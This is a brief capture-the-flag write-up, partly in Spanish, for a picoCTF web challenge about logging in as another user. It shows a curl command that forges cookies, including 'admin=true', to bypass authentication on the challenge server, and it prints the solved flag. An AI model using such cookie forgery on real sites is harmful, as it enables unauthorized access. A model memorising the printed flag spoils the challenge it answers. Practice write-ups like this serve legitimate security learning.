
## Descripcion

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796
## Solucion
```
Tuve que editar las cookies usando un curl a la pagina, 
curl link -H 'Cookie: username=juan; password=holamundo; admin=true'

Por ahi salio la bandera usando: | grep pico
```

## Flag
picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}